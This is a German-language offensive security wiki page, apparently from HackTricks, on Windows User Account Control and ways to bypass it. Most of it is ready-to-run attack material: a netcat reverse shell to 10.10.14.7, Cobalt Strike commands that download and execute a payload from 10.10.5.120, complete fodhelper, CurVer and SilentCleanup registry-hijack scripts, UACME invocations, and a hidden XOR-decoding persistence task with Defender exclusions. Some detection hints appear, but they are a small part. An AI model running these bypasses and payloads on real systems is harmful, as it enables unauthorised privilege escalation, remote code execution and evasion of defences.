# UAC - Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die **Zustimmungsaufforderungen für Aktivitäten mit erhöhten Berechtigungen** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, es sei denn, ein Administrator autorisiert diese Anwendungen/Aufgaben ausdrücklich, mit Administratorrechten auf das System zuzugreifen. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze gilt.<sup>[[2]](#references)</sup>

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorkonto zwei Tokens: ein Standardbenutzer-Token für normale Aktionen mit mittlerer Integrität und eines mit Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert, einschließlich des Anmeldevorgangs, der Benutzererfahrung und der UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC für ihre Organisation lokal (mithilfe von secpol.msc) zu konfigurieren oder sie in einer Active-Directory-Domänenumgebung über Gruppenrichtlinienobjekte (GPO) zu konfigurieren und bereitzustellen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich behandelt. Für UAC können 10 Gruppenrichtlinieneinstellungen konfiguriert werden. Die folgende Tabelle enthält weitere Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Benutzerkontensteuerung: Administratorbestätigungsmodus für das integrierte Administratorkonto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: Verhalten der Eingabeaufforderung zur Rechteerweiterung für Administratoren im Administratorbestätigungsmodus](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsaufforderung für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [Benutzerkontensteuerung: Verhalten der Eingabeaufforderung zur Rechteerweiterung für Standardbenutzer](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Aufforderung zur Eingabe von Anmeldeinformationen auf dem sicheren Desktop)         |
| [Benutzerkontensteuerung: Anwendunginstallationen erkennen und zur Rechteerweiterung auffordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; in Enterprise standardmäßig deaktiviert)           |
| [Benutzerkontensteuerung: Nur signierte und überprüfte ausführbare Dateien mit erhöhten Rechten ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: Nur UIAccess-Anwendungen mit erhöhten Rechten ausführen, die an sicheren Speicherorten installiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: Alle Administratoren im Administratorbestätigungsmodus ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: UIAccess-Anwendungen erlauben, ohne den sicheren Desktop zur Rechteerweiterung aufzufordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: Beim Anfordern erhöhter Rechte zum sicheren Desktop wechseln](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: Fehler beim Schreiben in Dateien und Registrierung in benutzerspezifische Speicherorte virtualisieren](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** (auf den meisten Systemen „secpol.msc“) sind standardmäßig so konfiguriert, dass **Nicht-Administratoren keine Software installieren können**. Das bedeutet: Selbst wenn ein Nicht-Administrator den Installer für eine Software herunterladen kann, kann er ihn ohne ein Administratorkonto nicht ausführen.

### Registrierungsschlüssel, um UAC zur Anforderung erhöhter Rechte zu zwingen

Als Standardbenutzer ohne Administratorrechte können Sie sicherstellen, dass das „Standard“-Konto **von UAC zur Eingabe von Anmeldeinformationen aufgefordert wird**, wenn es bestimmte Aktionen ausführen soll. Dafür müssen bestimmte **Registrierungsschlüssel** geändert werden. Dazu benötigen Sie Administratorrechte, es sei denn, es gibt einen **UAC bypass** oder der Angreifer ist bereits als Administrator angemeldet.

Selbst wenn der Benutzer der Gruppe **Administratoren** angehört, zwingen diese Änderungen den Benutzer dazu, **seine Anmeldeinformationen erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist das nur dann nützlich, wenn bereits ein Token mit erhöhten Rechten, ein UAC bypass oder eine Fehlkonfiguration vorliegt, über die sich diese Schlüssel ändern lassen. Andernfalls wird der Schreibzugriff auf die Registrierung selbst blockiert.**

Die folgenden Registrierungsschlüssel und Einträge müssen geändert werden (Standardwerte in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool „Lokale Sicherheitsrichtlinie“ erfolgen. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldeinformationen erneut einzugeben.

### Hinweis

**Die Benutzerkontensteuerung ist keine Sicherheitsgrenze.** Standardbenutzer können daher ihre Konten nicht verlassen und Administratorrechte erlangen, sofern sie keinen lokalen Privilegieneskalations-Exploit verwenden.

### Einen Benutzer um „vollen Zugriff auf den Computer“ bitten

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC-Berechtigungen

- Der geschützte Modus von Internet Explorer verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe zugreifen (wie den Ordner für temporäre Internetdateien). Dazu wird der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt. Wenn der Browser versucht, auf Daten in der Zone mit niedriger Integritätsstufe zuzugreifen, prüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, zu verhindern, dass Remote-Codeausführungsangriffe Zugriff auf sensible Daten auf dem System erhalten.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen sind als Kombination der Rechte und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldeinformationen des Benutzers, die zur Authentifizierung des Benutzers am Computer und bei Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, legen Sie den **Registrierungsschlüssel `AutoAdminLogon`** fest. Das ist für Kiosk-Umgebungen oder zu Testzwecken nützlich. Verwenden Sie dies nur auf sicheren Systemen, da das Kennwort dadurch in der Registrierung offengelegt wird.

Legen Sie die folgenden Schlüssel mit dem Registrierungs-Editor oder `reg add` fest:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = Benutzername
  - `DefaultPassword` = Kennwort

Um zum normalen Anmeldeverhalten zurückzukehren, setzen Sie `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachten Sie: Wenn Sie grafischen Zugriff auf das Opfer haben, ist UAC bypass unkompliziert, da Sie einfach auf „Ja“ klicken können, wenn die UAC-Abfrage erscheint.

UAC bypass ist in folgender Situation erforderlich: **UAC ist aktiviert, Ihr Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und Ihr Benutzer gehört zur Administratorengruppe**.

Wichtig ist, dass es **wesentlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei jeder der anderen Stufen (Default).**

### Schnelle Triage über eine Shell mit mittlerer Integritätsstufe

Prüfen Sie vor dem Versuch eines Bypasses, ob Sie sich in der richtigen Situation befinden, und ordnen Sie den Host-Build bekannten, funktionierenden Methoden zu:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktische Hinweise:
- Wenn `EnableLUA=0` ist, benötigst du keinen Bypass: Jedes Admin-Token kann direkt hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das übliche Szenario für Auto-Elevate-/COM-basierte Bypässe.
- `Always Notify` setzt die Hürde höher, aber du solltest trotzdem den genauen Build testen, statt von einem Fehlschlag auszugehen: UACME führt weiterhin einige mit `AlwaysNotify` kompatible Methoden für moderne Windows-Builds auf.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), kannst du **eine Reverse Shell mit Admin-Rechten** (hohe Integritätsstufe) ausführen, etwa mit:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC-bypass mit Token-Duplikation

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Lokales RPC + wiederverwendbares Debug-Objekt

Die lokale RPC-Schnittstelle von AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` kann einen Prozess mit aktiviertem Debugging erstellen. Prozesse, die auf demselben Thread mit aktiviertem Debugging erstellt werden, teilen sich das Debug-Objekt des Threads; ein Debug-Ereignis bei der Prozesserstellung enthält ein Prozess-Handle mit Vollzugriff, selbst wenn das RPC-Ergebnis selbst nur eingeschränkten Zugriff gewährt. Dadurch wird die Wiederverwendung eines Debug-Objekts zu einem UAC-Primitive für ein Mitglied der Gruppe Administrators mit mittlerer Integritätsstufe.<sup>[[11]](#references)[[12]](#references)</sup>

Eine praktische Kette sieht so aus:<sup>[[11]](#references)[[12]](#references)</sup>

1. Rufe die lokale RPC-Methode auf (direkt oder über `NdrAsyncClientCall`), um einen nicht erhöhten Wegwerfprozess mit aktiviertem Debugging zu erstellen.
2. Frage `ProcessDebugObjectHandle` mit `NtQueryInformationProcess` ab, trenne das Objekt mit `NtRemoveProcessDebug`, behalte es und beende den Wegwerfprozess.
3. Verwende dieselbe RPC-Schnittstelle, um einen vertrauenswürdigen, automatisch erhöhten Prozess zu erstellen, und ordne das gespeicherte Objekt anschließend über `DbgUiSetThreadDebugObject` dem aufrufenden Thread zu.
4. Rufe `WaitForDebugEvent` auf und übernimm das Prozess-Handle aus dem `CREATE_PROCESS_DEBUG_EVENT`; dupliziere es mit `NtDuplicateObject`, bevor du fortfährst.
5. Übergib das duplizierte Handle an `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` und starte die Payload mit einer erweiterten Startup-Info-Struktur. Dadurch werden sowohl der Kontext des erhöhten Prozesses wiederverwendet als auch für den untergeordneten Prozess eine vertrauenswürdig wirkende übergeordnete Prozessbeziehung hergestellt.

Suche nach der kurzen Abfolge und nicht nur nach der automatisch erhöhten Binärdatei: Erstellung eines Prozesses über das lokale AppInfo-RPC, Abfragen von `ProcessDebugObjectHandle`, Trennen und erneutes Zuordnen des Debuggers, ein unmittelbar folgendes Erstellungs-Debug-Ereignis, Duplizieren des Handles und ein untergeordneter Prozess, dessen aufgezeichneter übergeordneter Prozess nicht mit dem Prozess übereinstimmt, der die Erstellungs-APIs aufgerufen hat.<sup>[[12]](#references)</sup>

### **Sehr** einfacher UAC-„bypass“ (vollständiger Dateisystemzugriff)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe Administrators ist, kannst du die über SMB freigegebene **C$-Freigabe** lokal auf einem neuen Laufwerk einbinden und erhältst **Zugriff auf alles im Dateisystem** (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Dieser Trick scheint nicht mehr zu funktionieren**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass mit Cobalt Strike

Die Cobalt-Strike-Techniken funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum Bypass von **UAC**.

### Erhöhte COM-Schnittstellen (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-Objekte sind auch auf aktuellen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als funktionierend auf aktuellen Windows-Versionen geführt. Offensive Tools passen `CMSTPLUA` laufend an, indem sie einen interaktiven Desktop-Prozess und 64-Bit-Ausführung kombinieren und manchmal PEB-/Prozess-Masquerading einsetzen, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzuge einen **64-Bit**-Prozess in der **interaktiven Sitzung** des Benutzers (häufig `explorer.exe` oder ein untergeordneter Prozess).
- Wenn eine Raw Shell fehlschlägt, versuche es erneut mit einer BOF-/UACME-Implementierung statt mit einem naiven `CreateProcess`-Wrapper.
- Rechne damit, dass die Ausführung des untergeordneten Prozesses in einem **separaten erhöhten Prozess** erfolgt; viele BOFs erhöhen nicht die Rechte des aktuellen Beacons direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Bypass-Exploits

[**UACME**](https://github.com/hfiref0x/UACME) ist eine Sammlung von UAC-Bypass-Techniken. Kompiliere es mit Visual Studio oder MSBuild; beim Build werden mehrere ausführbare Dateien erstellt (zum Beispiel `Source\Akagi\output\x64\Debug\Akagi.exe`), wähle also die für den Ziel-Build geeignete Methode aus.<sup>[[3]](#references)</sup>\
Sei vorsichtig: Einige Bypasses starten sichtbare Programme oder Eingabeaufforderungen, die den Benutzer alarmieren können.<sup>[[3]](#references)</sup>

UACME führt die **Build-Version auf, ab der die jeweilige Technik funktioniert**.<sup>[[3]](#references)</sup> Du kannst nach einer Technik suchen, die deine Versionen betrifft:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Außerdem erhältst du auf dieser [Seite](https://en.wikipedia.org/wiki/Windows_10_version_history) anhand der Build-Versionen das Windows-Release `1607`.

Ein praktischer Workflow besteht darin, zuerst den **Host-Build zu bewerten** und erst danach die passende Methode auszuführen:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden. Das ist hilfreich, um veraltete PoCs schnell auszusortieren.<sup>[[4]](#references)</sup>
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem bestimmten Build zuzuordnen. Version 3.7.1 fügte die Methoden 83–85 hinzu, während die vorherige Version bestehende Methoden unter **Windows 11 25H2** erneut testete. Prüfe die Methodentabelle und die Release Notes erneut, statt anzunehmen, dass ein alter PoC unverändert funktioniert.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess-Ketten mit Always Notify (UACME 3.7.1)

`Always Notify` verhindert nicht jeden UAC-Bypass. UACME 3.7.1 implementiert drei neue x64-Methoden, die vom Benutzer kontrollierbare Umgebungs-/Protokollzustände mit dem Verhalten erhöhter geplanter Tasks oder von UIAccess kombinieren. Alle sind als `AlwaysNotify compatible` gekennzeichnet:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` umleiten, damit die WNF-ausgelöste Aufgabe `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` das erhöhte `taskhostw.exe` dazu bringt, `unifiedconsent.dll` per Side-Loading zu laden. UACME erfasst diese Methode ab Windows 10 Build 19041.
- **84 — TabTip:** Dasselbe Umgebungsvariablen-Primitiv gegen UIAccess-`TabTip.exe` einsetzen, das je nach Build `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` oder `rsaenh.dll` lädt, und anschließend aus dem resultierenden UIAccess-Kontext mit hoher Integrität pivotieren. UACME erfasst diese Methode ab Windows 8.1 / Server 2016.
- **85 — Narrator:** Das benutzerspezifische `feedback-hub`-Protokoll kapern, Narrator mit `Alt+CapsLock+F` steuern und anschließend eine beschreibbare Kopie von `osk.exe` starten, die `OskSupport.dll` per Side-Loading lädt. Dafür ist ein interaktiver Desktop erforderlich. UACME erfasst diese Methode ab Windows 10 1809 / Server 2019.

Nachdem du die Payload-Units und Akagi wie in der UACME-Dokumentation beschrieben erstellt hast, rufe die entsprechende Methodennummer auf (der optionale Befehl ist standardmäßig `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methoden 84 und 85 setzen UIAccess/Desktop-Interaktion voraus. Daher ist nicht zu erwarten, dass sie unverändert aus Session 0 oder einer nicht interaktiven Service-Shell funktionieren. Alle drei verändern den Umgebungs-/Protokollstatus und legen DLLs ab. Prüfe die Implementierung und entferne diese Artefakte nach dem Testen.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC-Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird auf modernen Windows-Versionen automatisch erhöht. Beim Start fragt sie den unten stehenden benutzerspezifischen Registry-Pfad ab, ohne das Verb `DelegateExecute` zu validieren. Ein dort platzierter Befehl ermöglicht es einem Prozess mit mittlerer Integritätsstufe (der Benutzer ist Mitglied der Administratoren), ohne UAC-Abfrage einen Prozess mit hoher Integritätsstufe zu starten.

Von fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Gruppe „Administratoren“ ist und die UAC-Stufe auf dem Standardwert oder einer weniger strengen Einstellung steht (nicht auf „Immer benachrichtigen“ mit zusätzlichen Einschränkungen).
- Verwende den Pfad `sysnative`, um PowerShell mit 64-Bit aus einem 32-Bit-Prozess auf 64-Bit-Windows zu starten.
- Die Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für Stealth interaktive Benutzeroberflächen.

#### `ComputerDefaults.exe`-Trigger für denselben `ms-settings`-Handler

`ComputerDefaults.exe` löst dieselbe benutzerspezifische `ms-settings\Shell\Open\command`-Zuordnung auf wie `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nachdem du wie oben den Standardbefehl und einen leeren `DelegateExecute`-Wert festgelegt hast, verwende `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` als alternativen Trigger. Die Registry-Einrichtung muss nicht wiederholt werden.<sup>[[13]](#references)[[14]](#references)</sup> Die Voraussetzungen für einen Administrator mit mittlerer Integritätsstufe und die UAC-Richtlinie aus den obigen `fodhelper.exe`-Hinweisen gelten weiterhin.<sup>[[2]](#references)[[3]](#references)</sup> UACME führt diesen Trigger ab Windows 10 RS4 (Build 17134) auf. Überprüfe daher, ob er auf dem Ziel-Build funktioniert.<sup>[[3]](#references)</sup>

#### CurVer/extension-hijack-Variante (nur HKCU)

Neuere Samples, die `fodhelper.exe` missbrauchen, umgehen `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerspezifischen `CurVer`-Wert um. Die automatisch erhöhte Binärdatei löst den Handler weiterhin unter `HKCU` auf, sodass zum Anlegen der Schlüssel kein Admin-Token erforderlich ist:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Nach der Rechteausweitung **deaktiviert** Malware häufig **künftige Abfragen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie weitere Maßnahmen zur Umgehung von Schutzmechanismen aus (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und richtet Persistenz erneut ein, um mit hoher Integritätsstufe ausgeführt zu werden. Eine typische Persistenzaufgabe speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf dem Datenträger und decodiert und führt es stündlich im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Diese Variante entfernt weiterhin den Dropper und lässt nur die gestagten Payloads zurück. Dadurch muss die Erkennung auf die Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, dem Erstellen von Defender-Ausnahmen oder geplanten Tasks beruhen, die PowerShell im Speicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC-Umgehung über den Task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Berechtigungen und expandiert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Expansion auf einen beliebigen Befehl umleiten und so ohne Zustimmungsdialog hohe Integrität erlangen.<sup>[[8]](#references)</sup> Diese Methode ist auch auf aktuellen Builds einen Test wert, da UACME die Technik weiterhin unterstützt und die Nachverfolgung aktueller Issues darauf hindeutet, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen der Anführungszeichen erfordert.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Wenn die Aufgabe auf diesem Build den Pfad in Anführungszeichen setzt, wiederhole den Versuch mit einer Payload, die mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige nach dem Test immer `HKCU\Environment\windir`.

#### Weitere UAC-Bypässe

Viele klassische UAC-Bypässe, die UI-Abläufe, COM-Objekte oder Desktop-Interaktionen ausnutzen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein Dienst, der in **Session 0** läuft, reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **Prozess**, dessen Wert für **Session** gleich **1** ist:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) verweisen lassen und diese Erweiterung unserer Payload zuordnen – Weitere UAC-Bypässe: Das lässt sich mit einer meterpreter-Sitzung erreichen. Migriere zu einem Prozess, dessen Session-Wert ...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC-Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Abfrage einfach akzeptieren, wenn sie erscheint; du brauchst also nicht unbedingt einen technischen Bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Hürden zu umgehen, die UAC mit sich bringt.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand gerade verwendet hat (möglicherweise über RDP), **laufen dort möglicherweise einige Tools als Administrator**, über die du zum Beispiel direkt eine **cmd**-Shell **als Administrator starten** kannst, ohne erneut von UAC dazu aufgefordert zu werden, wie etwa mit [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das könnte etwas **unauffälliger** sein.

### Lauter Brute-Force-UAC-Bypass

